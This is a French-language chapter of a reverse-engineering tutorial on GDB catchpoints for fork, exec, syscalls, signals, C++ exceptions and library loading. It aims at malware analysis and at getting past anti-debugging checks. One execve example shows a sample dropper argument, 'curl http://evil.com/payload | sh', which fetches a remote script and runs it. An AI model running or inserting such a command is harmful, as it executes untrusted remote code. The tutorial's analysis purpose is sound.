🔝 Retour au [Sommaire](/SOMMAIRE.md)

# 11.6 — Catchpoints : intercepter les `fork`, `exec`, `syscall`, signaux

> **Chapitre 11 — Débogage avec GDB**  
> **Partie III — Analyse Dynamique**

---

## Un troisième type de point d'arrêt

Les breakpoints surveillent l'exécution d'une instruction à une adresse donnée. Les watchpoints surveillent les modifications d'une zone mémoire. Les **catchpoints** surveillent un troisième type d'événement : les **interactions du programme avec le système d'exploitation** — création de processus, chargement de programmes, appels système, réception de signaux, levée d'exceptions C++.

En reverse engineering, les catchpoints répondent à des questions que ni les breakpoints ni les watchpoints ne couvrent efficacement :

- « Ce binaire fork-t-il un processus enfant pour échapper au débogueur ? »  
- « Quel programme est exécuté par cet appel à `execve` ? »  
- « Quel syscall est utilisé pour ouvrir ce fichier — `open` ou `openat` ? »  
- « Ce processus reçoit-il des signaux pour synchroniser ses threads ? »  
- « Où exactement est levée cette exception C++ ? »

Les catchpoints interceptent ces événements au moment précis où ils se produisent, avant que le noyau ne les traite, permettant d'inspecter l'état complet du programme à cet instant.

## Catchpoints sur `fork` et `vfork`

### Pourquoi surveiller `fork`

Un certain nombre de techniques anti-débogage reposent sur `fork`. Le scénario classique : le programme appelle `fork()`, le processus parent s'attache en tant que « débogueur » du processus enfant via `ptrace(PTRACE_TRACEME)`, empêchant tout débogueur externe de s'y attacher (un processus ne peut avoir qu'un seul traceur). D'autres binaires utilisent `fork` pour isoler leur logique sensible dans un processus enfant, rendant l'analyse plus complexe.

Détecter et intercepter ces `fork` est donc essentiel.

### Poser un catchpoint sur `fork`

```
(gdb) catch fork
Catchpoint 1 (fork)
(gdb) run
...
Catchpoint 1 (forked process 23456), 0x00007ffff7ea1234 in __libc_fork ()
```

GDB s'arrête au moment du `fork`, avant que le processus enfant ne commence à exécuter. On peut inspecter l'état complet du parent et le PID du nouveau processus enfant.

Pour `vfork` (variante où le parent est suspendu jusqu'à ce que l'enfant appelle `exec` ou `_exit`) :

```
(gdb) catch vfork
Catchpoint 2 (vfork)
```

### Suivre le parent ou l'enfant après un `fork`

Par défaut, GDB continue de déboguer le processus **parent** après un `fork`. Le processus enfant s'exécute librement sans contrôle. Ce comportement se configure :

```
(gdb) set follow-fork-mode child
```

Avec ce réglage, GDB lâche le parent et s'attache au processus enfant après le `fork`. Les options possibles :

| Mode | Comportement |  
|---|---|  
| `parent` (défaut) | GDB reste attaché au parent, l'enfant tourne librement |  
| `child` | GDB s'attache à l'enfant, le parent tourne librement |

Pour déboguer **les deux** processus simultanément :

```
(gdb) set detach-on-fork off
```

Avec ce réglage, GDB garde le contrôle sur les deux processus. Le processus non suivi est suspendu. On peut basculer entre eux :

```
(gdb) info inferiors
  Num  Description       Connection  Executable
* 1    process 23455     1 (native)  ./dropper
  2    process 23456     1 (native)  ./dropper

(gdb) inferior 2         # Basculer vers le processus enfant
[Switching to inferior 2 [process 23456] (./dropper)]
```

Le concept d'**inferior** dans GDB représente un processus débogué. Chaque `fork` crée un nouvel inferior. On peut poser des breakpoints, inspecter la mémoire et avancer dans chaque inferior indépendamment.

> 💡 **En RE de malware :** les droppers et certains ransomwares utilisent fréquemment `fork` + `exec` pour lancer leur payload. Le workflow typique est : `catch fork` → identifier le PID enfant → `set follow-fork-mode child` → relancer → déboguer la payload directement. C'est exactement ce que nous ferons au chapitre 28.

## Catchpoints sur `exec`

### Intercepter le chargement d'un nouveau programme

L'appel système `execve` remplace l'image du processus courant par un nouveau programme. C'est l'étape qui suit généralement un `fork` dans le pattern `fork` + `exec`.

```
(gdb) catch exec
Catchpoint 3 (exec)
(gdb) run
...
Catchpoint 3 (exec'd /usr/bin/sh), process 23456
```

GDB s'arrête juste après que le noyau a chargé le nouveau programme mais avant que celui-ci ne commence à exécuter. Le message indique le chemin du programme chargé (`/usr/bin/sh` dans cet exemple). On peut inspecter :

```
(gdb) info proc exe
process 23456
/usr/bin/sh

(gdb) info proc mappings    # Voir le nouveau layout mémoire
```

C'est un moment charnière en RE : on voit exactement quel binaire est exécuté et avec quels arguments. Si le binaire analysé lance un script shell ou un second exécutable, le catchpoint `exec` le révèle sans ambiguïté.

### Capturer les arguments de `execve`

Pour connaître les arguments passés au nouveau programme, il est souvent plus direct de poser un breakpoint sur la fonction `execve` (ou `execvp`, `execl`, etc.) plutôt qu'un catchpoint, car le breakpoint s'arrête **avant** l'appel et permet d'inspecter les arguments :

```
(gdb) break execve
Breakpoint 4 at 0x7ffff7ea5678
(gdb) run
...
Breakpoint 4, __execve (path=0x7fffffffe200 "/usr/bin/sh",
    argv=0x7fffffffe100, envp=0x7fffffffe120)

(gdb) x/s *(char **)($rsi)           # argv[0]
0x7fffffffe200: "/usr/bin/sh"
(gdb) x/s *(char **)($rsi + 8)       # argv[1]
0x7fffffffe210: "-c"
(gdb) x/s *(char **)($rsi + 16)      # argv[2]
0x7fffffffe220: "curl http://evil.com/payload | sh"
```

L'avantage du catchpoint `exec`, en revanche, est qu'il fonctionne même quand le programme utilise directement le syscall `execve` sans passer par la libc (technique d'évasion courante dans les malwares).

## Catchpoints sur les appels système : `catch syscall`

### Pourquoi intercepter les syscalls

`strace` (vu au chapitre 5) est l'outil standard pour tracer les appels système, mais il a des limitations en contexte de RE :

- Il trace **tous** les syscalls, sans possibilité de filtrage fin.  
- Il ne permet pas d'inspecter la mémoire ou les registres au moment de l'appel.  
- Il ne permet pas de modifier les arguments ou le retour d'un syscall.  
- Certains binaires détectent `strace` (via `ptrace`) et changent de comportement.

Les catchpoints syscall dans GDB résolvent ces quatre limitations. On intercepte des syscalls spécifiques, on inspecte l'état complet du processus, on peut modifier les registres avant que le syscall ne soit exécuté, et GDB utilise déjà `ptrace` — pas de traceur supplémentaire à détecter.

### Syntaxe de base

```
(gdb) catch syscall
Catchpoint 5 (any syscall)
```

Sans argument, GDB s'arrête sur **chaque** appel système — c'est l'équivalent de `strace` mais interactif. En pratique, c'est beaucoup trop verbeux. On filtre par nom ou par numéro :

```
(gdb) catch syscall open
Catchpoint 6 (syscall 'open' [2])

(gdb) catch syscall openat
Catchpoint 7 (syscall 'openat' [257])

(gdb) catch syscall write
Catchpoint 8 (syscall 'write' [1])
```

On peut spécifier plusieurs syscalls dans une même commande :

```
(gdb) catch syscall open openat read write close
Catchpoint 9 (syscalls 'open' [2] 'openat' [257] 'read' [0] 'write' [1] 'close' [3])
```

Ou utiliser le numéro directement (utile quand GDB ne connaît pas le nom) :

```
(gdb) catch syscall 59         # execve (numéro 59 sur x86-64)
```

### Entrée et sortie du syscall

Un catchpoint syscall se déclenche **deux fois** pour chaque appel : une fois à l'**entrée** (avant que le noyau ne traite l'appel) et une fois à la **sortie** (quand le noyau rend la main au processus). GDB indique clairement la phase :

```
Catchpoint 6 (call to syscall open), 0x00007ffff7eb1234 in __open64 ()
```

C'est l'entrée — le syscall est sur le point d'être exécuté. Les arguments sont dans les registres :

```
(gdb) print/x $rdi             # 1er arg : pathname
(gdb) x/s $rdi
0x402030: "/etc/passwd"
(gdb) print/x $rsi             # 2e arg : flags
$1 = 0x0                       # O_RDONLY
(gdb) continue

Catchpoint 6 (returned from syscall open), 0x00007ffff7eb1238 in __open64 ()
```

C'est la sortie — le syscall est terminé. La valeur de retour est dans `rax` :

```
(gdb) print $rax
$2 = 3                         # File descriptor 3 — ouverture réussie
```

Si on ne s'intéresse qu'à l'entrée ou qu'à la sortie, on combine avec `commands` :

```
(gdb) catch syscall write
Catchpoint 10 (syscall 'write' [1])
(gdb) commands 10
  silent
  # On est à l'entrée OU à la sortie — on filtre
  if $rax == -38
    # À l'entrée d'un syscall, rax contient -ENOSYS (= -38) sur certains noyaux
    # En pratique, on identifie l'entrée par le contenu des arguments
    printf "write(fd=%d, buf=%p, len=%d)\n", (int)$rdi, $rsi, (int)$rdx
    x/s $rsi
  end
  continue
end
```

> 💡 **Astuce :** pour distinguer entrée et sortie de manière fiable, on peut utiliser l'API Python de GDB. La section 11.8 montrera comment écrire un handler Python qui exploite `gdb.events.stop` pour identifier la phase du catchpoint.

### Syscalls utiles à surveiller en RE

| Syscall | Numéro (x86-64) | Intérêt en RE |  
|---|---|---|  
| `open` / `openat` | 2 / 257 | Fichiers accédés (config, payloads, fichiers cibles) |  
| `read` / `write` | 0 / 1 | Données lues et écrites (contenu de fichiers, I/O réseau) |  
| `connect` | 42 | Connexions réseau sortantes (C2, exfiltration) |  
| `socket` | 41 | Création de sockets (protocole, type) |  
| `mmap` / `mprotect` | 9 / 10 | Allocation mémoire exécutable (décompression de code, JIT) |  
| `execve` | 59 | Exécution d'un nouveau programme |  
| `clone` / `fork` | 56 / 57 | Création de processus/threads |  
| `ptrace` | 101 | Anti-débogage (le binaire tente de se tracer lui-même) |  
| `unlink` | 87 | Suppression de fichiers (nettoyage de traces) |  
| `kill` | 62 | Envoi de signaux (communication inter-processus) |

Le catchpoint sur `ptrace` est particulièrement précieux : de nombreux binaires appellent `ptrace(PTRACE_TRACEME)` comme technique anti-débogage. En interceptant cet appel, on peut modifier `rax` pour simuler un succès (retour 0) et neutraliser la protection :

```
(gdb) catch syscall ptrace
Catchpoint 11 (syscall 'ptrace' [101])
(gdb) commands 11
  silent
  # À la sortie du syscall, forcer le retour à 0 (succès)
  set $rax = 0
  continue
end
```

Le catchpoint sur `mprotect` révèle les moments où un binaire rend une zone mémoire exécutable — c'est le signal d'un unpacking ou d'un déchiffrement de code en mémoire (chapitre 29).

## Gestion des signaux : `handle`

Les signaux Unix sont un mécanisme de communication entre le noyau (ou d'autres processus) et le processus débogué. Par défaut, GDB intercepte certains signaux et en ignore d'autres. La commande `handle` configure ce comportement.

### Comportement par défaut

Pour voir la politique actuelle pour tous les signaux :

```
(gdb) info signals
Signal        Stop   Print  Pass to program  Description  
SIGHUP        Yes    Yes    Yes              Hangup  
SIGINT        Yes    Yes    No               Interrupt  
SIGQUIT       Yes    Yes    Yes              Quit  
SIGILL        Yes    Yes    Yes              Illegal instruction  
SIGTRAP       Yes    Yes    No               Trace/breakpoint trap  
SIGABRT       Yes    Yes    Yes              Aborted  
SIGFPE        Yes    Yes    Yes              Floating point exception  
SIGKILL       Yes    Yes    Yes              Killed  
SIGSEGV       Yes    Yes    Yes              Segmentation fault  
SIGPIPE       Yes    Yes    Yes              Broken pipe  
SIGALRM       No     No     Yes              Alarm clock  
SIGUSR1       Yes    Yes    Yes              User defined signal 1  
SIGUSR2       Yes    Yes    Yes              User defined signal 2  
...
```

Les trois colonnes de configuration :

| Colonne | Signification |  
|---|---|  
| **Stop** | GDB arrête l'exécution quand le signal est reçu |  
| **Print** | GDB affiche un message quand le signal est reçu |  
| **Pass** | GDB transmet le signal au programme (sinon il l'absorbe) |

### Configurer la gestion d'un signal

```
(gdb) handle SIGALRM stop print nopass
```

Avec cette configuration, quand le programme reçoit `SIGALRM` : GDB arrête l'exécution (`stop`), affiche un message (`print`), mais ne transmet **pas** le signal au programme (`nopass`). Le programme ne sait jamais que l'alarme a sonné.

Les options possibles :

| Option | Effet |  
|---|---|  
| `stop` / `nostop` | Arrêter / ne pas arrêter l'exécution |  
| `print` / `noprint` | Afficher / ne pas afficher un message |  
| `pass` / `nopass` | Transmettre / ne pas transmettre au programme |

Configurations courantes en RE :

```
# Ignorer SIGALRM (souvent utilisé pour des timeouts anti-debug)
(gdb) handle SIGALRM noprint nostop pass

# Intercepter SIGUSR1 (parfois utilisé pour la communication inter-processus)
(gdb) handle SIGUSR1 stop print nopass

# Intercepter SIGSEGV pour analyser un crash sans que le programme ne termine
(gdb) handle SIGSEGV stop print nopass
```

### Catchpoints sur les signaux

En complément de `handle`, on peut poser un catchpoint sur la réception d'un signal :

```
(gdb) catch signal SIGSEGV
Catchpoint 12 (signal SIGSEGV)
```

La différence avec `handle SIGSEGV stop` est subtile mais importante : le catchpoint est un vrai point d'arrêt qui apparaît dans `info breakpoints`, peut avoir une condition, et peut être associé à un bloc `commands`. Il est aussi supprimable indépendamment des autres réglages de signaux.

```
(gdb) catch signal SIGUSR1
Catchpoint 13 (signal SIGUSR1)
(gdb) commands 13
  silent
  printf "SIGUSR1 reçu, rip=%p\n", $rip
  backtrace 3
  continue
end
```

Ce catchpoint logue chaque réception de `SIGUSR1` avec la pile d'appels, sans interrompre l'exécution.

### Signaux et anti-débogage

Certaines techniques anti-débogage exploitent les signaux :

**Timing via `SIGALRM`.** Le programme arme une alarme avec `alarm(2)`. Si le programme est débogué (et donc ralenti), l'alarme expire avant la fin du traitement normal, déclenchant `SIGALRM` dont le handler termine le programme ou change de comportement. La parade :

```
(gdb) handle SIGALRM nostop noprint pass
# Ou mieux : empêcher l'alarme en interceptant le syscall alarm
(gdb) catch syscall alarm
(gdb) commands
  silent
  set $rdi = 0        # alarm(0) annule l'alarme
  continue
end
```

**Auto-signalement avec `SIGTRAP`.** Le programme s'envoie un `SIGTRAP` (le signal généré par les breakpoints). Sous un débogueur, `SIGTRAP` est intercepté par GDB ; sans débogueur, le handler de signal du programme est appelé. Le programme détecte la différence. La parade :

```
(gdb) handle SIGTRAP nostop pass
```

En passant le `SIGTRAP` au programme sans s'arrêter, GDB imite le comportement sans débogueur.

## Catchpoints sur les exceptions C++

GDB peut intercepter la levée (`throw`) et la capture (`catch`) d'exceptions C++ :

```
(gdb) catch throw
Catchpoint 14 (throw)

(gdb) catch catch
Catchpoint 15 (catch)
```

Le catchpoint `throw` s'arrête au moment où une exception est levée, avant que la pile ne soit déroulée. C'est le moment idéal pour inspecter l'état du programme — une fois l'exception attrapée par un `catch`, les frames intermédiaires ont été détruits.

```
Catchpoint 14 (exception thrown), 0x00007ffff7e8a123 in __cxa_throw ()
(gdb) backtrace
#0  __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6
#1  0x0000000000401234 in ?? ()          # Code qui lève l'exception
#2  0x0000000000401456 in ?? ()
#3  0x0000000000401789 in ?? ()
```

On peut filtrer par type d'exception :

```
(gdb) catch throw std::runtime_error
```

GDB ne s'arrêtera que pour les exceptions de type `std::runtime_error`. Cela nécessite que les informations RTTI soient présentes dans le binaire (ce qui est le cas par défaut en C++ avec GCC, sauf si `-fno-rtti` a été utilisé).

En RE de binaires C++, les catchpoints d'exceptions sont utiles pour comprendre le flux de contrôle des programmes qui utilisent les exceptions comme mécanisme de gestion d'erreurs : plutôt que de retourner un code d'erreur, le programme lève une exception, et le catchpoint permet de voir exactement où et pourquoi.

## Catchpoints sur le chargement de bibliothèques

GDB peut s'arrêter quand une bibliothèque partagée est chargée ou déchargée dynamiquement :

```
(gdb) catch load
Catchpoint 16 (load)

(gdb) catch load libcrypto
Catchpoint 17 (load libcrypto)

(gdb) catch unload
Catchpoint 18 (unload)
```

Le catchpoint `catch load` sans argument s'arrête au chargement de **n'importe quelle** bibliothèque. Avec un nom, il filtre par nom de bibliothèque (correspondance partielle).

C'est particulièrement utile quand un binaire utilise `dlopen` pour charger des plugins ou des bibliothèques à la demande :

```
Catchpoint 17 (loaded libcrypto.so.3), ...
(gdb) info sharedlibrary
From                To                  Syms Read  Shared Object Library
0x00007ffff7fc0000  0x00007ffff7fd2000  Yes         /lib64/ld-linux-x86-64.so.2
0x00007ffff7dc0000  0x00007ffff7f5d000  Yes         /lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7a00000  0x00007ffff7c50000  Yes         /lib/x86_64-linux-gnu/libcrypto.so.3
```

On peut alors poser des breakpoints sur les fonctions de la bibliothèque nouvellement chargée. C'est le workflow standard pour analyser un binaire qui charge ses routines de chiffrement dynamiquement (chapitre 24) ou un système de plugins (chapitre 22).

## Lister et gérer les catchpoints

Les catchpoints apparaissent dans la liste commune avec les breakpoints et watchpoints :

```
(gdb) info breakpoints
Num  Type        Disp Enb Address            What
1    catchpoint  keep y                      fork
3    catchpoint  keep y                      exec
6    catchpoint  keep y                      syscall "open" [2]
12   catchpoint  keep y                      signal "SIGSEGV"
14   catchpoint  keep y                      exception throw
17   catchpoint  keep y                      load of library matching "libcrypto"
```

Toutes les commandes de gestion habituelles s'appliquent :

```
(gdb) disable 6          # Désactiver le catchpoint syscall open
(gdb) enable 6           # Réactiver
(gdb) delete 12          # Supprimer le catchpoint signal SIGSEGV
(gdb) condition 6 $rdi != 0    # Ajouter une condition
```

## Résumé des commandes

| Commande | Événement intercepté |  
|---|---|  
| `catch fork` | Appel à `fork()` |  
| `catch vfork` | Appel à `vfork()` |  
| `catch exec` | Appel à `execve()` (chargement d'un nouveau programme) |  
| `catch syscall [nom\|num]` | Appel(s) système spécifique(s) ou tous |  
| `catch signal [SIG]` | Réception d'un signal |  
| `catch throw [type]` | Levée d'une exception C++ |  
| `catch catch [type]` | Capture d'une exception C++ |  
| `catch load [lib]` | Chargement d'une bibliothèque partagée |  
| `catch unload [lib]` | Déchargement d'une bibliothèque partagée |  
| `set follow-fork-mode child\|parent` | Choisir quel processus suivre après un fork |  
| `set detach-on-fork off` | Garder le contrôle sur les deux processus |  
| `handle SIG [no]stop [no]print [no]pass` | Configurer la gestion d'un signal |

---

> **À retenir :** Les catchpoints interceptent les événements système que ni les breakpoints ni les watchpoints ne couvrent : création de processus, exécution de programmes, appels système individuels, signaux et exceptions. En RE, ils sont indispensables pour analyser les binaires multi-processus (`fork` + `exec`), tracer les accès fichiers et réseau au niveau syscall, neutraliser les techniques anti-débogage basées sur `ptrace` ou les signaux, et comprendre les chargements dynamiques de bibliothèques. Combinés avec des blocs `commands`, ils deviennent des sondes système non intrusives qui logguent les interactions du binaire avec le noyau.

⏭️ [Remote debugging avec `gdbserver` (debugging sur cible distante)](/11-gdb/07-remote-debugging-gdbserver.md)
